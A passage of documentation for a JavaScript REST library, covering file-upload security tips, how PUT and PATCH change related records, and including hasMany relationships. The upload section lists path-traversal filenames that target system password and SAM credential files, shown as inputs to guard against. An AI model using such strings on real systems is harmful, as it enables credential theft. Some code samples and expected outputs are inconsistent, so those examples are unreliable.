   // Dangerous filenames to watch for:
   // "../../../etc/passwd"
   // "..\\..\\windows\\system32\\config\\sam"
   // "uploads/../../../index.js"
   
   // LocalStorage handles this automatically
   ```

3. **Extension validation** - Whitelist allowed extensions
   ```javascript
   // Use LocalStorage with whitelist
   const storage = new LocalStorage({
     allowedExtensions: ['.jpg', '.jpeg', '.png', '.pdf']
   });
   ```

4. **Consider removing extensions entirely** for sensitive files
   ```javascript
   const highSecurityStorage = new LocalStorage({
     nameStrategy: 'hash',
     preserveExtension: false  // All files become .bin
   });
   ```

### General File Security

1. **Validate MIME types** - But remember they can be spoofed
2. **Check file contents** - Use libraries like `file-type` for verification
3. **Limit upload sizes** - Prevent denial of service
4. **Store files outside web root** - Prevent direct execution
5. **Use virus scanning** - For user-uploaded content
6. **Set proper permissions** - Uploaded files shouldn't be executable
7. **Serve files with proper headers** - Use Content-Disposition for downloads

## Next Steps

- Implement production S3 storage with actual AWS SDK
- Add image processing (thumbnails, resizing)
- Implement virus scanning for uploads
- Add progress tracking for large files
- Create a chunked upload system for very large files# Effects of PUT and PATCH on Related Data

## Understanding Update Operations

When updating resources through the REST API, it's crucial to understand how PUT and PATCH operations affect related data. This chapter explores the differences between these operations and their impact on all types of relationships.

First, let's define and create some resources:

```javascript
// Define publishers resource
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255 },
    country: { type: 'string', required: true, max: 100 }
  },
  relationships: {
    books: { hasMany: 'books', foreignKey: 'publisher_id' }
  }
});
await api.resources.publishers.createKnexTable();

// Define authors resource
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100 },
    surname: { type: 'string', required: true, max: 100 },
    birth_year: { type: 'number', required: true }
  },
  relationships: {
    books: { hasMany: 'books', foreignKey: 'author_id' }
  }
});
await api.resources.authors.createKnexTable();

// Define genres resource
await api.addResource('genres', {
  schema: {
    name: { type: 'string', required: true, max: 100, unique: true }
  }
});
await api.resources.genres.createKnexTable();

// Define books resource with belongsTo and many-to-many relationships
await api.addResource('books', {
  schema: {
    title: { type: 'string', required: true, max: 255 },
    isbn: { type: 'string', required: true, max: 13, unique: true },
    published_year: { type: 'number', required: true },
    page_count: { type: 'number', required: true },
    author_id: { type: 'id', belongsTo: 'authors', as: 'author', required: true },
    publisher_id: { type: 'id', belongsTo: 'publishers', as: 'publisher', nullable: true }
  },
  relationships: {
    // Many-to-many relationship with genres
    genres: { 
      hasMany: 'genres',
      through: 'book_genres',
      foreignKey: 'book_id',
      otherKey: 'genre_id'
    }
  }
});
await api.resources.books.createKnexTable();

// Define the pivot table for book-genre relationships
await api.addResource('book_genres', {
  schema: {
    book_id: { type: 'id', required: true },
    genre_id: { type: 'id', required: true },
    created_at: { type: 'datetime', default: 'now' },
    primary_genre: { type: 'boolean', default: false }
  }
});
await api.resources.book_genres.createKnexTable();
```

Let's create a comprehensive dataset that includes all relationship types. We'll use this same dataset throughout the chapter to demonstrate how each operation affects the data.

Please note that each one of the following sections in this guide will expect this whole dataset to be freshly added:

```javascript
// Create publishers
const penguinPublisher = await api.resources.publishers.post({
  name: 'Penguin Random House',
  country: 'USA'
});
// Returns: { id: 1, name: 'Penguin Random House', country: 'USA' }

const harperPublisher = await api.resources.publishers.post({
  name: 'HarperCollins',
  country: 'USA'
});
// Returns: { id: 2, name: 'HarperCollins', country: 'USA' }

// Create authors
const tolkien = await api.resources.authors.post({
  name: 'J.R.R.',
  surname: 'Tolkien',
  birth_year: 1892
});
// Returns: { id: 1, name: 'J.R.R.', surname: 'Tolkien', birth_year: 1892 }

const orwell = await api.resources.authors.post({
  name: 'George',
  surname: 'Orwell',
  birth_year: 1903
});
// Returns: { id: 2, name: 'George', surname: 'Orwell', birth_year: 1903 }

// Create genres
const fantasyGenre = await api.resources.genres.post({
  name: 'Fantasy'
});
// Returns: { id: 1, name: 'Fantasy' }

const adventureGenre = await api.resources.genres.post({
  name: 'Adventure'
});
// Returns: { id: 2, name: 'Adventure' }

const classicGenre = await api.resources.genres.post({
  name: 'Classic'
});
// Returns: { id: 3, name: 'Classic' }

const dystopianGenre = await api.resources.genres.post({
  name: 'Dystopian'
});
// Returns: { id: 4, name: 'Dystopian' }

// Create a book with all relationships
const hobbitBook = await api.resources.books.post({
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  author_id: tolkien.id,
  publisher_id: penguinPublisher.id,
  genres: [ fantasyGenre.id, adventureGenre.id, classicGenre.id ] 
});

// console.log('hobbitBook:', inspect(hobbitBook));

// Create more books by the same author (to demonstrate hasMany relationship)
const lotrBook = await api.resources.books.post({
  title: 'The Lord of the Rings',
  isbn: '9780544003415',
  published_year: 1954,
  page_count: 1216,
  author_id: tolkien.id,
  publisher_id: penguinPublisher.id,
  genres: [ fantasyGenre.id, adventureGenre.id ] 

});

const silmarillionBook = await api.resources.books.post({
  title: 'The Silmarillion',
  isbn: '9780544338012',
  published_year: 1977,
  page_count: 365,
  author_id: tolkien.id,
  publisher_id: penguinPublisher.id,
  genres: [ fantasyGenre.id ] 

});
```

### Our Complete Dataset

After running the setup code above, we have:

| Table | Records | Relationships |
|-------|---------|---------------|
| **publishers** | 2 records | Each has books (hasMany) |
| **authors** | 2 records | Each has books (hasMany) |
| **genres** | 4 records | - |
| **books** | 3 records | • The Hobbit: belongsTo Tolkien & Penguin, has 3 genres<br>• LOTR: belongsTo Tolkien & Penguin, has 2 genres<br>• Silmarillion: belongsTo Tolkien & Penguin, has 1 genre |
| **book_genres** | 6 records | Pivot table linking books to genres |

### Viewing the Current State

```javascript
// Fetch The Hobbit with all relationships
const currentBook = await api.resources.books.get({
  id: hobbitBook.id,
  queryParams: { 
    include: ['author', 'publisher', 'genres'] 
  }
});

console.log('Current book state:', currentBook);
```

## PUT Operations: Complete Replacement

**Important**: Each example in this section starts with the full dataset created above. The effects shown are what happens when you run that specific PUT operation on the original data.

### Example 1: PUT with All Relationships Specified

```javascript
// Starting with our full dataset from above
await api.resources.books.put({
  id: hobbitBook.id,
  title: 'The Hobbit: An Unexpected Journey',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 320,
  author_id: tolkien.id,              // Same author
  publisher_id: harperPublisher.id,    // Changed publisher
  genres: [
    fantasyGenre.id,    // Kept Fantasy
    adventureGenre.id,  // Kept Adventure  
    dystopianGenre.id   // Added Dystopian
    // Classic genre removed!
  ]
});
```

From now on, I will assume that we do this after every call:

```javascript
const currentBookAfter = await api.resources.books.get({
  id: hobbitBook.id,
  queryParams: { 
    include: ['author', 'publisher', 'genres'] 
  }
});

console.log('Book state AFTER the change:', currentBookAfter);
```

**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • title: Updated<br>• page_count: Changed from 310 to 320<br>• author_id: Unchanged (still Tolkien)<br>• publisher_id: Changed from 1 (Penguin) to 2 (Harper) |
| **book_genres** | • Fantasy record: **PRESERVED** (with original created_at)<br>• Adventure record: **PRESERVED** (with original created_at)<br>• Classic record: **DELETED**<br>• Dystopian record: **CREATED** |
| **Other author's books** | **NO CHANGES** - LOTR and Silmarillion still exist |
| **publishers** | **NO CHANGES** - Both publishers still exist |
| **authors** | **NO CHANGES** - Both authors still exist |
| **genres** | **NO CHANGES** - All 4 genres still exist |

The PUT operation follows the philosophy of **complete resource replacement**. When you PUT a resource, you're saying "replace the entire current state with exactly what I'm sending." This means:
- All fields you send are updated to the new values
- All fields you DON'T send are cleared (set to NULL or their defaults)
- For many-to-many relationships, the system intelligently syncs: it keeps matching records (preserving their metadata), removes missing ones, and adds new ones

**Expected result**:

```text
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit: An Unexpected Journey',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 320,
  genres_ids: [ '1', '2', '4' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '4', name: 'Dystopian' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '2',
  publisher: { id: '2', name: 'HarperCollins', country: 'USA', books_ids: [] }
}
```
### Example 2: PUT with Missing Relationships

```javascript
// Starting with our full dataset from above
await api.resources.books.put({
  id: hobbitBook.id,
  title: 'The Hobbit - Revised',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  author_id: tolkien.id
  // publisher_id and genres NOT included!
});
```
**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • title: Updated<br>• author_id: Remains 1 (Tolkien)<br>• publisher_id: **SET TO NULL** |
| **book_genres** | **ALL 3 RECORDS DELETED** - Book no longer has any genres |
| **Other books** | **NO CHANGES** - LOTR and Silmarillion unchanged |

Again, PUT is a **complete replacement** operation. Since we didn't include `publisher_id` or `genres` in our request, the API treats this as "I want a book with no publisher and no genres." The result:
- `publisher_id` becomes NULL (it's nullable, so this is allowed)  
- All genre relationships are removed from the pivot table
- Missing fields are NOT preserved from the current state - they're cleared

**Expected output**

```text
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit - Revised',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  }
}
```

### Example 3: PUT with Explicit Nulls

```javascript
// Starting with our full dataset from above
await api.resources.books.put({
  id: hobbitBook.id,
  title: 'The Hobbit - Standalone',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  author_id: tolkien.id,      // Required field, cannot be null
  publisher_id: null,         // Explicitly clearing publisher
  genres: []                  // Explicitly clearing all genres
});
```

**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • title: Updated<br>• author_id: Remains 1 (required field)<br>• publisher_id: **SET TO NULL** |
| **book_genres** | **ALL 3 RECORDS DELETED** |
| **Other books** | **NO CHANGES** |

This example shows PUT with **explicit nulls and empty arrays**. There's no difference between omitting a field and explicitly setting it to null/[] in a PUT operation - both result in clearing the data. This reinforces that PUT is about **complete state replacement**:
- You must include ALL data you want to keep
- Anything missing or null is cleared
- Required fields (like `author_id`) must always be provided and cannot be null


**Expected output**:

```text
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit - Standalone',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  }
}
```

## PATCH Operations: Partial Updates

**Important**: Each example in this section starts with the full dataset created above. The effects shown are what happens when you run that specific PATCH operation on the original data.

### Example 1: PATCH Updating Only Some Fields

```javascript
// Starting with our full dataset from above
await api.resources.books.patch({
  id: hobbitBook.id,
  title: 'The Hobbit: There and Back Again',
  publisher_id: harperPublisher.id
  // isbn, published_year, page_count, author_id, and genres NOT mentioned
});
```

**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • title: Updated<br>• isbn: **UNCHANGED**<br>• published_year: **UNCHANGED**<br>• page_count: **UNCHANGED**<br>• author_id: **UNCHANGED** (still Tolkien)<br>• publisher_id: Changed from 1 to 2 |
| **book_genres** | **NO CHANGES** - All 3 genre relationships preserved |
| **Other books** | **NO CHANGES** |

PATCH follows the philosophy of **partial updates** - it only modifies what you explicitly send. This is fundamentally different from PUT:
- Fields you send are updated
- Fields you DON'T send remain untouched
- Only the `title` and `publisher_id` were mentioned, so only these changed
- The `genres` relationship wasn't mentioned, so all 3 genre associations remain intact


**Expected output**:

```text
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit: There and Back Again',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '2',
  publisher: { id: '2', name: 'HarperCollins', country: 'USA', books_ids: [] }
}
```

### Example 2: PATCH Modifying Many-to-Many

```javascript
await api.resources.books.patch({
  id: hobbitBook.id,
  genres: [
    fantasyGenre.id,     // Keep Fantasy
    dystopianGenre.id    // Add Dystopian
    // Adventure and Classic will be removed
  ]
  // All other fields NOT mentioned - unchanged
});
```

**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • All fields: **UNCHANGED** |
| **book_genres** | • Fantasy: **PRESERVED** (with original created_at and primary_genre values)<br>• Adventure: **DELETED**<br>• Classic: **DELETED**<br>• Dystopian: **CREATED** |
| **Other tables** | **NO CHANGES** |

With PATCH, when you DO mention a relationship, it gets completely replaced for that relationship only. Here we mentioned `genres`, so:
- The genres relationship is updated to exactly what we specified
- Other fields (title, author_id, etc.) remain unchanged because they weren't mentioned
- The intelligent sync still applies to the genres: Fantasy is preserved with its metadata, others are added/removed as needed

**Expected output**:

```text
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '4' ],
  genres: [ { id: '1', name: 'Fantasy' }, { id: '4', name: 'Dystopian' } ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
```

### Example 3: PATCH Clearing Specific Relationships

```javascript
// Starting with our full dataset from above
await api.resources.books.patch({
  id: hobbitBook.id,
  publisher_id: null,
  genres: []
  // author_id and other fields NOT mentioned - unchanged
});
```

**Effects on the database:**

| Table | Changes |
|-------|---------|
| **books** | • All attributes: **UNCHANGED**<br>• author_id: **UNCHANGED** (still Tolkien)<br>• publisher_id: **SET TO NULL** |
| **book_genres** | **ALL 3 RECORDS DELETED** |
| **Other tables** | **NO CHANGES** |

This shows PATCH's **selective update** nature. We explicitly set `publisher_id` to null and `genres` to an empty array:
- These specific relationships are cleared as requested
- Everything else (title, author_id, etc.) remains unchanged
- This is surgical precision - update only what you explicitly mention
- To clear something with PATCH, you must explicitly set it to null or []

**Expected output**:

```html
Book state BEFORE the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [ '1', '2', '3' ],
  genres: [
    { id: '1', name: 'Fantasy' },
    { id: '2', name: 'Adventure' },
    { id: '3', name: 'Classic' }
  ],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  },
  publisher_id: '1',
  publisher: {
    id: '1',
    name: 'Penguin Random House',
    country: 'USA',
    books_ids: []
  }
}
Book state AFTER the change: {
  id: '1',
  title: 'The Hobbit',
  isbn: '9780547928227',
  published_year: 1937,
  page_count: 310,
  genres_ids: [],
  author_id: '1',
  author: {
    id: '1',
    name: 'J.R.R.',
    surname: 'Tolkien',
    birth_year: 1892,
    books_ids: []
  }
}
```

## Key Differences Summary

Starting with our complete dataset, here's how each operation type affects the data:

| Operation | What You Send | Effect on Unmentioned Data |
|-----------|---------------|---------------------------|
| **PUT** | Complete resource replacement | • Attributes: Set to defaults/null<br>• BelongsTo: Set to null (unless required)<br>• Many-to-Many: All relationships removed |
| **PATCH** | Only fields to update | • Attributes: Unchanged<br>• BelongsTo: Unchanged<br>• Many-to-Many: Unchanged |

### Effects by Relationship Type

| Relationship | PUT (not mentioned) | PUT (null/[]) | PATCH (not mentioned) | PATCH (null/[]) |
|--------------|-------------------|---------------|---------------------|----------------|
| **BelongsTo (nullable)** | Set to NULL | Set to NULL | Unchanged | Set to NULL |
| **BelongsTo (required)** | Must be provided | Cannot be NULL | Unchanged | Cannot be NULL |
| **Many-to-Many** | All removed | All removed | Unchanged | All removed |
| **HasMany** | No effect* | N/A | No effect* | N/A |

*HasMany relationships (like author's other books) are never affected by updates to a single book.

## Why HasMany Relationships Are Never Affected

It's crucial to understand why hasMany relationships (and polymorphic hasMany) are never affected by PUT or PATCH operations on the parent record. The reason is fundamental:

**HasMany relationships point to actual records, not just links.**

When a book "belongs to" an author:
- The book has an `author_id` field (a simple foreign key)
- This is just a reference that can be changed

But when an author "has many" books:
- Each book is a complete, independent record in the books table
- These aren't just "links" that can be deleted - they're real data with their own lifecycle
- To modify these relationships, you must update each book individually

For example:
```javascript
// This will NOT delete Tolkien's other books:
await api.resources.authors.put({
  id: tolkien.id,
  name: 'J.R.R.',
  surname: 'Tolkien',
  birth_year: 1892
  // No mention of books - but they still exist!
});

// To actually remove a book from an author, you must update the book:
await api.resources.books.patch({
  id: lotrBook.id,
  author_id: null  // or another author's ID
});
```

This design prevents accidental data loss and maintains data integrity. Child records are independent entities that must be managed through their own endpoints.

## Understanding Pivot Table Preservation

The intelligent synchronization for many-to-many relationships is important to understand:

```javascript
// Looking at our book_genres table structure:
// - book_id
// - genre_id  
// - created_at
// - primary_genre

// When updating genres from [Fantasy, Adventure, Classic] to [Fantasy, Dystopian]:
// - Fantasy record: KEPT with original created_at and primary_genre values
// - Adventure record: DELETED
// - Classic record: DELETED  
// - Dystopian record: CREATED with new created_at and default primary_genre (false)
```

This preservation is crucial for:
- Maintaining audit trails (when was this genre assigned?)
- Preserving custom pivot data (is this the primary genre?)
- Minimizing database operations (only change what needs changing)

## Best Practices

1. **Use PATCH for targeted updates** - When you only want to change specific fields
2. **Use PUT when replacing everything** - When you have the complete new state
3. **Always include relationships you want to keep with PUT** - They will be cleared otherwise
4. **Remember required fields** - PUT must include all required fields like author_id
5. **Child records are independent** - Other books by the same author are never affected

## Next Steps

Now that you understand how updates affect relationships:
- Practice with PATCH for surgical updates
- Use PUT for complete replacements
- Plan your API calls to avoid unintended data loss
- Remember that the intelligent sync preserves pivot table metadata# 2.4 hasMany records

`hasMany` relationships represent a one-to-many association, where one resource can have multiple associated resources. For example, a `publisher` can have many `authors` (if we consider authors working for specific publishers). Unlike `belongsTo` relationships, the foreign key for a `hasMany` relationship resides on the *related* resource's table, not the primary resource.

This is why when defining a schema the `belongsTo` keys are in the main schema, whereas `hasMany` belongs to the `relationships` paramter. This is a design decision that marks the distinction between the two types of relationships. 

To demonstrate `hasMany` relationships with just two tables, we'll use `publishers` as our "one" side and `authors` as our "many" side, assuming authors are directly associated with a single publisher.

```javascript
// Define publishers resource
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255, search: true, indexed: true },
  },
  relationships: {
    // A publisher has many authors
    authors: { hasMany: 'authors', foreignKey: 'publisher_id' },
  },
  searchSchema: { // Adding search schema for publishers
    name: { type: 'string', filterOperator: 'like' }
  }
});
await api.resources.publishers.createKnexTable();

// Define authors resource, which belongs to a publisher
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    surname: { type: 'string', required: true, max: 100, search: true },
    publisher_id: { type: 'id', belongsTo: 'publishers', as: 'publisher', nullable: true }
  },
  searchSchema: { // Adding search schema for authors
    name: { type: 'string', filterOperator: 'like' },
    surname: { type: 'string', filterOperator: 'like' },
    publisher: { type: 'id', actualField: 'publisher_id', nullable: true },
    publisherName: { type: 'string', actualField: 'publishers.name', filterOperator: 'like' } // Cross-table search
  }
});
await api.resources.authors.createKnexTable();
```

Note that the `authors` resource has the `publisher_id` key set as a `belongsTo` field. This is not necessary for the `publishers` resource to work. However, it's good practice so that when loading an `authors` record `publisher_id` will _not_ appear in the list of attributes.

Now, let's add some data to reflect these `hasMany` connections. We'll create publishers and then associate authors with them using the `publisher_id` foreign key.

```javascript
// Re-add publishers for a fresh start
const frenchPublisher = await api.resources.publishers.post({ name: 'French Books Inc.' });
const germanPublisher = await api.resources.publishers.post({ name: 'German Press GmbH' });
const internationalPublisher = await api.resources.publishers.post({ name: 'Global Publishing' });

// Add authors, linking them to publishers
const frenchAuthor1 = await api.resources.authors.post({ name: 'Victor', surname: 'Hugo', publisher: frenchPublisher.id });
const frenchAuthor2 = await api.resources.authors.post({ name: 'Émile', surname: 'Zola', publisher: frenchPublisher.id });
const germanAuthor = await api.resources.authors.post({ name: 'Johann', surname: 'Goethe', publisher: germanPublisher.id });
const unassignedAuthor = await api.resources.authors.post({ name: 'Unknown', surname: 'Author', publisher: null });


console.log('Added French Publisher:', inspect(frenchPublisher));
console.log('Added Victor Hugo:', inspect(frenchAuthor1));
console.log('Added Émile Zola:', inspect(frenchAuthor2));
console.log('Added German Publisher:', inspect(germanPublisher));

// Get the French publisher and include its authors (simplified mode output)
const frenchPublisherWithAuthorIdss = await api.resources.publishers.get({
  id: frenchPublisher.id,
  queryParams: {
    include: ['authors'] // Use the relationship name 'authors' defined in the publishers schema
  }
});
console.log('French publisher  Authors (ids only):', inspect(allPublishersWithAuthorIds));

const frenchPublisherWithAuthorIds = await api.resources.publishers.get({ id: frenchPublisher.id, });
console.log('French publisher  Authors (author ids only, simplified):', inspect(frenchPublisherWithAuthorIds));

const frenchPublisherWithAuthorIdsFull = await api.resources.publishers.get({ id: frenchPublisher.id, simplified: false });
console.log('French publisher  Authors (author ids only, NOT simplified):', inspect(frenchPublisherWithAuthorIdsFull));
```

The output:

```text
Added French Publisher: { id: '1', name: 'French Books Inc.', authors_ids: [] }
Added Victor Hugo: { id: '1', name: 'Victor', surname: 'Hugo', publisher_id: '1' }
Added Émile Zola: { id: '2', name: 'Émile', surname: 'Zola', publisher_id: '1' }
Added German Publisher: { id: '2', name: 'German Press GmbH', authors_ids: [] }
French publisher  Authors (ids only, simplified): { id: '1', name: 'French Books Inc.', authors_ids: [ '1', '2' ] }
French publisher  Authors (ids only, NOT simplified): {
  data: {
    type: 'publishers',
    id: '1',
    attributes: { name: 'French Books Inc.' },
    relationships: {
      authors: {
        data: [ { type: 'authors', id: '1' }, { type: 'authors', id: '2' } ]
      }
    },
    links: { self: '/api/publishers/1' }
  },
  links: { self: '/api/publishers/1' }
}
```

Note that the fresh publisher has the IDs of the French authors, both in simplified and non-simplified mode. This is a very important feature. `json-rest-api` will minimise the number of queries needed to fetch the extra IDS, but having the relation will incur an extra computational cost; however, it will enable discoverability.


## Including `hasMany` Records (`include`)

To retrieve related `hasMany` resources, you'll use the `include` query parameter from the "one" side of the one-to-many relationship (e.g., fetching a publisher and including its authors).

When fetching data programmatically in **simplified mode** (which is the default), `hasMany` relationships will appear as **arrays of child objects** embedded directly within the parent resource. This denormalized structure is convenient for immediate use in your application code.

Using the exact same data as before, you can change the query to `include` countries:

```javascript
// Get the French publisher and include its authors (simplified mode output)
const frenchPublisherWithAuthorInfo = await api.resources.publishers.get({
  id: frenchPublisher.id,
  queryParams: {
    include: ['authors'] // Use the relationship name 'authors' defined in the publishers schema
  }
});
console.log('French publisher Authors (with authors, only, simplified):', inspect(frenchPublisherWithAuthorInfo));

// Get the French publisher and include its authors (simplified mode output)
const frenchPublisherWithAuthorInfoFull = await api.resources.publishers.get({
  id: frenchPublisher.id,
  queryParams: {
    include: ['authors'] // Use the relationship name 'authors' defined in the publishers schema
  },
  simplified: false
});
console.log('French publisher  Authors (with authors, NOT simplified):', inspect(frenchPublisherWithAuthorInfoFull));
```

This is the result:

```text
French publisher  Authors (with authors, NOT simplified): {
  data: {
    type: 'publishers',
    id: '1',
    attributes: { name: 'French Books Inc.' },
    relationships: {
      authors: {
        data: [ { type: 'authors', id: '1' }, { type: 'authors', id: '2' } ],
        links: {
          self: '/api/publishers/1/relationships/authors',
          related: '/api/publishers/1/authors'
        }
      }
    },
    links: { self: '/api/publishers/1' }
  },
  included: [
    {
      type: 'authors',
      id: '1',
      attributes: { name: 'Victor', surname: 'Hugo' },
      relationships: { publisher: { data: { type: 'publishers', id: '1' } } },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: { name: 'Émile', surname: 'Zola' },
      relationships: { publisher: { data: { type: 'publishers', id: '1' } } },
      links: { self: '/api/authors/2' }
    }
  ],
  links: { self: '/api/publishers/1' }
}
```

Include will also work with `query()`:

```javascript

// Query all publishers and include their authors (simplified mode output)
const allPublishersWithAuthors = await api.resources.publishers.query({
  queryParams: {
    include: ['authors']
  }
});
// HTTP: GET /api/publishers?include=authors
// Returns (simplified): [
//   { id: '1', name: 'French Books Inc.', country_id: '1', 
//     authors: [
//       { id: '1', name: 'Victor Hugo', publisher_id: '1' },
//       { id: '2', name: 'Alexandre Dumas', publisher_id: '1' }
//     ]
//   },
//   { id: '2', name: 'German Press GmbH', country_id: '2', 
//     authors: [
//       { id: '3', name: 'Johann Wolfgang von Goethe', publisher_id: '2' }
//     ]
//   },
//   { id: '3', name: 'UK Books Ltd.', country_id: '3', authors: [] },
//   { id: '4', name: 'Global Publishing', country_id: null, authors: [] }
// ]

console.log('All Publishers with Authors:', inspect(allPublishersWithAuthors));
// Note: allPublishersWithAuthors contains { data, meta, links }

// Query all publishers and include their authors (non-simplified, full JSON:API output)
const allPublishersWithAuthorsNotSimplified = await api.resources.publishers.query({
  queryParams: {
    include: ['authors']
  },
  simplified: false
});
// HTTP: GET /api/publishers?include=authors
// Returns (JSON:API): {
//   data: [
//     { type: 'publishers', id: '1', attributes: { name: 'French Books Inc.' },
//       relationships: { 
//         authors: { data: [
//           { type: 'authors', id: '1' },
//           { type: 'authors', id: '2' }
//         ]}
//       }
//     },
//     { type: 'publishers', id: '2', attributes: { name: 'German Press GmbH' },
//       relationships: { 
//         authors: { data: [{ type: 'authors', id: '3' }] }
//       }
//     },
//     { type: 'publishers', id: '3', attributes: { name: 'UK Books Ltd.' },
//       relationships: { authors: { data: [] } }
//     },
//     { type: 'publishers', id: '4', attributes: { name: 'Global Publishing' },
//       relationships: { authors: { data: [] } }
//     }
//   ],
//   included: [
//     { type: 'authors', id: '1', attributes: { name: 'Victor Hugo' } },
//     { type: 'authors', id: '2', attributes: { name: 'Alexandre Dumas' } },
//     { type: 'authors', id: '3', attributes: { name: 'Johann Wolfgang von Goethe' } }
//   ]
// }

console.log('All Publishers with Authors (not simplified):', inspect(allPublishersWithAuthorsNotSimplified));
```

**Expected Output:**

```text
All Publishers with Authors: [
  {
    id: '1',
    name: 'French Books Inc.',
    authors_ids: [ '1', '2' ],
    authors: [
      { id: '1', name: 'Victor', surname: 'Hugo' },
      { id: '2', name: 'Émile', surname: 'Zola' }
    ]
  },
  {
    id: '2',
    name: 'German Press GmbH',
    authors_ids: [ '3' ],
    authors: [ { id: '3', name: 'Johann', surname: 'Goethe' } ]
  },
    { id: '3', name: 'Global Publishing', authors_ids: [] }
  ],
  meta: {...},
  links: {...}
}
All Publishers with Authors (not simplified): {
  data: [
    {
      type: 'publishers',
      id: '1',
      attributes: { name: 'French Books Inc.' },
      relationships: {
        authors: {
          data: [
            { type: 'authors', id: '1' },
            { type: 'authors', id: '2' }
          ],
          links: {
            self: '/api/publishers/1/relationships/authors',
            related: '/api/publishers/1/authors'
          }
        }
      },
